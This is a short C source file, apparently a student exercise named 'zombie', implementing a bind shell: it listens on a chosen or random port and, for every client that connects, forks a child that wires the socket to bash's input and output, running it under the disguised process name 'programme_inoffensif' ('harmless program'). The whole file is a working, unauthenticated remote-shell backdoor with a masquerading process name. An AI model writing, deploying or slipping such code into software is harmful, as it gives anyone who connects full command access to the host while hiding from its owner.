#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils_v2.h"
#include "zombie.h"

#define BACKLOG 5

#define BUFFER_SZ 1024
#define BASH "programme_inoffensif"

void child(void *newsockfd) {
  int *socketfd = newsockfd;

  dup2(*socketfd, STDIN_FILENO);
  dup2(*socketfd, STDOUT_FILENO);
  dup2(*socketfd, STDERR_FILENO);

  sexecl("/bin/bash", BASH, NULL);
}

int create_socket(unsigned short PORT) {
  int sockfd = ssocket();
  sbind(PORT, sockfd);
  slisten(sockfd, BACKLOG);
  printf("Le serveur tourne sur le port %d\n", PORT);

  return sockfd;
}

int main(int argc, char *arg[]) {
  unsigned short PORT;
  if (arg[1] != NULL) {
    PORT = atoi(arg[1]);
  } else {
    int random = randomIntBetween(0, NBR_PORTS - 1);
    PORT = PORTS[random];
  }

  int sockfd = create_socket(PORT);

  while (1) {
    int newsockfd = saccept(sockfd);
    printf("Client connected.\n");
    fork_and_run1(child, &newsockfd);
  }
  
  // close connection to client
  // sclose(newsockfd);
  //printf("Client disconnected.\n");

  // close listen socket
  sclose(sockfd);
}
